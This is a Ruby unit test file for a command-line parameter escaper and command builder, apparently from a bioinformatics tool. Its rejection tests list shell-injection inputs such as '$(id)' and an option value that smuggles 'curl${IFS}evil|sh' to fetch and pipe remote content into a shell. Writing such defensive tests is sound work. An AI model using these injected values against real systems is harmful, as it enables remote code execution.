require "test_helper"

class SafeCmdlineParamTest < ActiveSupport::TestCase
  def esc(value)
    Basic.send(:safe_cmdline_param, value)
  end

  test "keeps existing encoding for ordinary values" do
    assert_equal '10', esc(10)
    assert_equal '/data/x/output.loom', esc('/data/x/output.loom')
    assert_equal '\\"a b\\"', esc('a b')
    assert_equal '\\"/col_attrs/T cells (CD4+)\\"', esc('/col_attrs/T cells (CD4+)')
    assert_equal '\\"[\\"a\\",\\"b\\"]\\"', esc('["a","b"]')
  end

  test "allows single-character delimiters" do
    assert_equal '\\;', esc(';')
    assert_equal '\\|', esc('|')
    assert_equal '\\t', esc('\\t')
  end

  test "rejects shell metacharacters" do
    ['0.1;id', '$(id)', '`id`', "x'; id; '", 'a|b', 'a&b', 'a > /tmp/x', "a\nid", 'a\\b'].each do |value|
      assert_raises(Basic.singleton_class::UnsafeCommandParameterError, "expected rejection of #{value.inspect}") do
        esc(value)
      end
    end
  end

  test "build_cmd refuses injected option values" do
    h_cmd = {
      'program' => 'java -jar asap.jar',
      'opts' => [{ 'opt' => '-f', 'value' => '0.1;curl${IFS}evil|sh' }],
      'args' => []
    }
    assert_raises(Basic.singleton_class::UnsafeCommandParameterError) { Basic.build_cmd(h_cmd) }
  end
end
